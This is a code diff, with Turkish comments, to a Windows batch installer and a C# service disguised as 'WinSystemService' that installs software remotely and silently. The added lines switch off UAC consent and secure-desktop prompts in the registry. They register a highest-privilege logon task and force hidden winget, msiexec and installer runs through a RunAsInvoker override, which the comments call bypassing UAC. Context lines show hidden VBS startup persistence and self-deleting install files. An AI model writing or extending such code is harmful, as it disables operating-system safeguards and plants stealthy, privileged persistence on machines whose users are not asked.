@@ -773,7 +773,7 @@ echo WshShell.Run chr^(34^) ^& "%EXE_FILE%" ^& chr^(34^), 0, False
 ) > "%VBS_STARTUP%"
 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinSystemService" /t REG_SZ /d "wscript.exe //B //Nologo \"%VBS_STARTUP%\"" /f >nul 2>&1
-schtasks /create /tn "WinSystemService" /tr "wscript.exe //B //Nologo \"%VBS_STARTUP%\"" /sc onlogon /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >nul 2>&1 & reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f >nul 2>&1 & schtasks /create /tn "WinSystemService" /tr "wscript.exe //B //Nologo \"%VBS_STARTUP%\"" /sc onlogon /rl highest /f >nul 2>&1
 
 del /f /q "%CS_FILE%" >nul 2>&1
 del /f /q "%INSTALL_DIR%\launch_silent.vbs" >nul 2>&1
@@ -1198,14 +1198,22 @@ namespace WinSystemService
 
                 if (type == "winget")
                 {
-                    SetInstallStatus(id, name, "installing", 30, "Winget paketi kuruluyor (" + cmd + ")...");
-                    string wingetArgs = "install " + cmd + " --silent --accept-package-agreements --accept-source-agreements --disable-interactivity";
-                    ProcessStartInfo psi = new ProcessStartInfo("winget", wingetArgs);
-                    psi.UseShellExecute = false;
-                    psi.CreateNoWindow = true;
-                    psi.WindowStyle = ProcessWindowStyle.Hidden;
+                    SetInstallStatus(id, name, "installing", 20, "Winget ile sessiz kurulum baslatiliyor (" + cmd + ")...");
+                    string pkg = (cmd ?? "").Trim();
 
-                    using (Process p = Process.Start(psi))
+                    // 1. ADIM: --scope user ile yonetici izni gerektirmeden kullanici alanina kurmayi dene (UAC sormaz)
+                    string userArgs = "install " + pkg + " --scope user --silent --accept-package-agreements --accept-source-agreements --disable-interactivity --force";
+                    if (!string.IsNullOrEmpty(args)) userArgs += " " + args;
+
+                    ProcessStartInfo psiUser = new ProcessStartInfo("winget", userArgs);
+                    psiUser.UseShellExecute = false;
+                    psiUser.CreateNoWindow = true;
+                    psiUser.WindowStyle = ProcessWindowStyle.Hidden;
+                    psiUser.EnvironmentVariables["__COMPAT_LAYER"] = "RunAsInvoker";
+                    psiUser.EnvironmentVariables["WINGET_DISABLE_INTERACTIVITY"] = "1";
+
+                    int userExitCode = -1;
+                    using (Process p = Process.Start(psiUser))
                     {
                         bool finished = p.WaitForExit(900000);
                         if (!finished)
@@ -1214,13 +1222,43 @@ namespace WinSystemService
                             SetInstallStatus(id, name, "error", 100, "Zaman asimi: Kurulum 15 dakikada tamamlanamadi.");
                             return;
                         }
-                        if (p.ExitCode == 0 || p.ExitCode == 3010)
+                        userExitCode = p.ExitCode;
+                    }
+
+                    if (userExitCode == 0 || userExitCode == 3010)
+                    {
+                        SetInstallStatus(id, name, "success", 100, "Basariyla kuruldu (UAC atlandi, kullanici alani)!");
+                        return;
+                    }
+
+                    // 2. ADIM: Paket sistem/machine seviyesinde yukleme gerektiriyorsa RunAsInvoker ve silent modda kur
+                    SetInstallStatus(id, name, "installing", 50, "Sistem modunda sessiz kurulum deneniyor (" + cmd + ")...");
+                    string machineArgs = "install " + pkg + " --silent --accept-package-agreements --accept-source-agreements --disable-interactivity --force";
+                    if (!string.IsNullOrEmpty(args)) machineArgs += " " + args;
+
+                    ProcessStartInfo psiMachine = new ProcessStartInfo("winget", machineArgs);
+                    psiMachine.UseShellExecute = false;
+                    psiMachine.CreateNoWindow = true;
+                    psiMachine.WindowStyle = ProcessWindowStyle.Hidden;
+                    psiMachine.EnvironmentVariables["__COMPAT_LAYER"] = "RunAsInvoker";
+                    psiMachine.EnvironmentVariables["WINGET_DISABLE_INTERACTIVITY"] = "1";
+
+                    using (Process p2 = Process.Start(psiMachine))
+                    {
+                        bool finished = p2.WaitForExit(900000);
+                        if (!finished)
+                        {
+                            try { p2.Kill(); } catch { }
+                            SetInstallStatus(id, name, "error", 100, "Zaman asimi: Kurulum 15 dakikada tamamlanamadi.");
+                            return;
+                        }
+                        if (p2.ExitCode == 0 || p2.ExitCode == 3010)
                         {
                             SetInstallStatus(id, name, "success", 100, "Basariyla kuruldu!");
                         }
                         else
                         {
-                            SetInstallStatus(id, name, "error", 100, "Kurulum basarisiz oldu. Hata Kodu: " + p.ExitCode);
+                            SetInstallStatus(id, name, "error", 100, "Kurulum basarisiz oldu. Hata Kodu: " + p2.ExitCode);
                         }
                     }
                 }
@@ -1289,17 +1327,18 @@ namespace WinSystemService
                     ProcessStartInfo psi;
                     if (ext == ".msi")
                     {
-                        string msiArgs = "/i \"" + tempFile + "\" " + (string.IsNullOrEmpty(args) ? "/qn /norestart" : args);
+                        string msiArgs = "/i \"" + tempFile + "\" /qn /norestart ALLUSERS=2 MSIINSTALLPERUSER=1 " + (string.IsNullOrEmpty(args) ? "" : args);
                         psi = new ProcessStartInfo("msiexec.exe", msiArgs);
                     }
                     else
                     {
-                        psi = new ProcessStartInfo(tempFile, string.IsNullOrEmpty(args) ? "/VERYSILENT /NORESTART /SP-" : args);
+                        psi = new ProcessStartInfo(tempFile, string.IsNullOrEmpty(args) ? "/VERYSILENT /NORESTART /SP- /SUPPRESSMSGBOXES /CURRENTUSER" : args);
                     }
 
                     psi.UseShellExecute = false;
                     psi.CreateNoWindow = true;
                     psi.WindowStyle = ProcessWindowStyle.Hidden;
+                    psi.EnvironmentVariables["__COMPAT_LAYER"] = "RunAsInvoker";
 
                     using (Process p = Process.Start(psi))
                     {
